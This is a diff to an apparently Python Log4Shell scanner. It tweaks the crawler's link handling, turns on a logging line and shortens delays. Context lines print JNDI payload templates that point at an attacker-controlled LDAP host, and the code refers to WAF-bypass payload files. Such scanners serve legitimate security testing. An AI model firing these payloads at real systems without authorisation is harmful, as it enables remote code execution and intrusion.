@@ -36,6 +36,7 @@ PAYLOAD_FILES = {'ldap': 'waf_bypass_ldap.txt', 'http': 'waf_bypass_http.txt', '
 def crawler_add2queue(path, url, queue):
   if path.startswith(url) and path not in queue:
     queue.append(path)
+    #cprint(f'[!]   => {path}', 'cyan') 
 
 
 ###
@@ -43,10 +44,10 @@ def crawler_get_url(url, html, queue):
   soup = BeautifulSoup(html, 'html.parser')
   for link in soup.find_all('a'):
     path = link.get('href')
-    if path and path.startswith('/'):
-      path = urljoin(url, path)
-    #print('  => ' + path)
-    crawler_add2queue(path, url, queue)
+    if path is not None:
+      if path and path.startswith('/'):
+        path = urljoin(url, path)
+      crawler_add2queue(path, url, queue)
 
 
 ###
@@ -56,7 +57,7 @@ def crawler(url):
 
   for u in queue:
     html = requests.get(u).text
-    #cprint('[!] Crawling: ' + u, 'cyan')
+    cprint('[!] Crawling: ' + u, 'cyan')
     crawler_get_url(u, html, queue)
   return queue
 
@@ -243,7 +244,7 @@ def main():
     cprint('[*] ASM - Active Scanner Module - Intels', 'green', attrs=['bold'])
     cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://' + _evil_site + ':' + _evil_port + '/a}', 'green')
     cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#' + _evil_site + ':' + _evil_port + '/a}', 'green')
-    time.sleep(4)
+    time.sleep(1)
     print('')
     cprint('[+] ASM - Active Scanner Module - Settins', 'yellow', attrs=['bold'])
     cprint(f'[+] Url         {url_tmp}', 'yellow')
@@ -256,10 +257,10 @@ def main():
     cprint(f'[+] Header      {_header}', 'yellow')
     cprint(f'[+] Data        {_data}', 'yellow')
     cprint(f'[+] Payload     {_payload}', 'yellow')
-    time.sleep(2)
+    time.sleep(1)
     print('')
     cprint('[!] ASM - Active Scanner Module - Starting', 'cyan', attrs=['bold'])
-    time.sleep(2)
+    time.sleep(1)
 
     for main_url in _url:
       if _crawl == 'yes':
